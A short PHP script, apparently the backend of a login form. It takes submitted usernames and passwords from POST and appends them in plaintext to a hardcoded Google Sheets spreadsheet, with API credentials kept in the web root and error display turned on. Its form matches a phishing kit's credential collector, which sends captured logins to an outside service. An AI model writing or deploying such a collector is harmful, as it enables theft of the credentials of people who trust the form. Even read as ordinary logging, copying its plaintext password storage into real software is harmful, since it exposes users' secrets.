<?php

ini_set('error_reporting', E_ALL);
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);

require_once($_SERVER['DOCUMENT_ROOT'].'/vendor/autoload.php');

$client = new Google_Client();
$client->setApplicationName('Google Sheets API PHP');
$client->setScopes(Google_Service_Sheets::SPREADSHEETS);
$client->setAccessType('offline');
$client->setAuthConfig($_SERVER['DOCUMENT_ROOT'].'/credentials.json');

$service = new Google_Service_Sheets($client);
$spreadsheetId = '1kRCizU1-YYbTnehw7ZnbsXU7VuK1aEZhsF4K9XX1wuc';
$range = 'Лист1';

$values = [[$_POST['userLogin'], $_POST['userPassword']]];
$body = new Google_Service_Sheets_ValueRange([
    'values' => $values
]);

$params = [
    'valueInputOption' => 'RAW'
];

$insert = [
    'insertDataOption' => 'INSERT_ROWS'
];

$result = $service->spreadsheets_values->append($spreadsheetId, $range, $body, $params, $insert);

?>